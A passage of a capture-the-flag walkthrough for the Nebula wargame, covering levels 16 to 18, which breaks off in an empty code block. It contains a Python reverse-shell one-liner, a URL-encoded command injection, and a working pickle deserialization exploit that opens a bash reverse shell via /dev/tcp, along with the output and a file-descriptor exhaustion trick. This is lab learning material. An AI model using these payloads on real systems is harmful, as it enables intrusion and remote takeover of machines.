</span><span class='line'>python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" nebula 1337
</span><span class='line'>
</span><span class='line'>sh-4.2$ chmod +x SH 
</span><span class='line'>
</span><span class='line'>sh-4.2$ nc -l 1337
</span><span class='line'>
</span><span class='line'># http://192.168.80.136:1616/index.cgi?username=$(/*/SH)
</span><span class='line'>sh-4.2$ wget -q -O /dev/null "http://192.168.80.136:1616/index.cgi?username=%24(/%2A/SH)
</span><span class='line'>
</span><span class='line'>flag16@nebula:/home/flag16$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level17</h2>

<figure class='code'><figcaption><span>level17.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">pickle</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">signal</span>
</span><span class='line'>
</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;why did you send me &quot;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">&quot;?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>  <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;Accepted connection from </span><span class="si">%s</span><span class="s">:</span><span class="si">%d</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>According <a href="https://docs.python.org/2/library/pickle.html">documentation</a> it is
not safe to use data from untrusted source, so <code>pickle.loads</code> on line 14 means RCE:</p>

<p><code>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</code></p>

<p>Our exploit for executing remote shell:</p>

<figure class='code'><figcaption><span>exploit.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">cPickle</span> <span class="kn">import</span> <span class="n">dumps</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">os</span>      <span class="kn">import</span> <span class="n">system</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="k">return</span> <span class="p">(</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&#39;bash -i &gt;&amp; /dev/tcp/0.0.0.0/1337 0&gt;&amp;1&#39;</span><span class="p">,))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Window 1: 
</span><span class='line'>sh-4.2$ nc -l 1337
</span><span class='line'>
</span><span class='line'># Window 2:
</span><span class='line'>sh-4.2$ ./exploit.py
</span><span class='line'>cposix
</span><span class='line'>system
</span><span class='line'>p1
</span><span class='line'>(S'bash -i >& /dev/tcp/0.0.0.0/1337 0>&1'
</span><span class='line'>p2
</span><span class='line'>tp3
</span><span class='line'>Rp4
</span><span class='line'>.
</span><span class='line'>
</span><span class='line'>sh-4.2$ ./exploit.py | nc nebula 10007
</span><span class='line'>Accepted connection from 127.0.0.1:42532
</span><span class='line'>
</span><span class='line'># Window 1:
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>flag17@nebula:/$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h2>Level18</h2>

<p>According challenge info, there are several ways how to solve this challenge.</p>

<figure class='code'><figcaption><span>level18.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;getopt.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">globals</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define dprintf(...) if(globals.debugfile) \</span>
</span><span class='line'><span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>
</span><span class='line'><span class="cp">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \</span>
</span><span class='line'><span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PWFILE &quot;/home/flag18/password&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Unable to read password file %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
</span><span class='line'>          <span class="k">return</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>                <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;logged in successfully (with%s password file)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="s">&quot;out&quot;</span> <span class="o">:</span> <span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;--&gt; [%s] is unsupported at this current time.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">&quot;unable to set user to &#39;%s&#39; -- not supported.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">&quot;d:v&quot;</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">switch</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;d&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">&quot;w+&quot;</span><span class="p">);</span>
</span><span class='line'>              <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">optarg</span><span class="p">);</span>
</span><span class='line'>              <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;v&#39;</span><span class="o">:</span>
</span><span class='line'>              <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>              <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Starting up. Verbose level = %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'>      <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">&#39;\r&#39;</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;got [%s] as input</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to login</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;shell&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">&quot;attempting to start shell</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span><span class='line'>              <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;unable to execve&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Permission denied</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;logout&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;closelog&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
</span><span class='line'>          <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;site exec&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;setuser&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>First thing that we tried was to use parameter <code>-d /home/flag18/password</code> to
rewrite password file with the known output, however the <code>strcmp()</code> doesn&rsquo;t match
for the reason that we cannot insert the newline character to the end of our string.</p>

<p>The <code>fclose()</code> on line 34 is not aligned, that&rsquo;s strange. We found out that this call is not used in the binary file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ gdb -batch -ex 'file /home/flag18/flag18' -ex 'set disassembly-flavor intel' -ex 'disassemble login' | grep close
</span><span class='line'>sh-4.2$</span></code></pre></td></tr></table></div></figure>


<p>We can use login function to exhaust file descriptors, because when the <code>fopen()</code> fails, we will be logged in. After a few tries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
